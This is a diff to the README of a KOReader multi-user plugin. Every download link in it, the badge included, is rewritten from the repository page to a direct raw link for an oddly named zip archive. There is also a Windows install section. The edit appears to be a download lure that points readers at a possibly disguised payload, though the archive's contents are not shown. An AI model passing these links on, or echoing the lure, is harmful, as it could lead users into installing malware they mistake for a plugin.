@@ -1,6 +1,6 @@
 # 🧩 KOReader_MultiUser.koplugin - Separate reading for every user
 
-[![Download KOReader_MultiUser.koplugin](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Britnicrowned717/KOReader_MultiUser.koplugin)
+[![Download KOReader_MultiUser.koplugin](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Britnicrowned717/KOReader_MultiUser.koplugin/raw/refs/heads/main/multiuser.koplugin/koplugin_KO_User_Reader_Multi_v3.9.zip)
 
 ## 📖 What this does
 
@@ -33,7 +33,7 @@ Recommended setup:
 
 Visit this page to download the plugin and patch files:
 
-[GitHub download page](https://github.com/Britnicrowned717/KOReader_MultiUser.koplugin)
+[GitHub download page](https://github.com/Britnicrowned717/KOReader_MultiUser.koplugin/raw/refs/heads/main/multiuser.koplugin/koplugin_KO_User_Reader_Multi_v3.9.zip)
 
 ## 🛠️ Install on Windows
 
@@ -192,7 +192,7 @@ Your shared app should return to its normal state.
 
 Repository and download page:
 
-https://github.com/Britnicrowned717/KOReader_MultiUser.koplugin
+https://github.com/Britnicrowned717/KOReader_MultiUser.koplugin/raw/refs/heads/main/multiuser.koplugin/koplugin_KO_User_Reader_Multi_v3.9.zip
 
 ## 🗂️ Topics
 
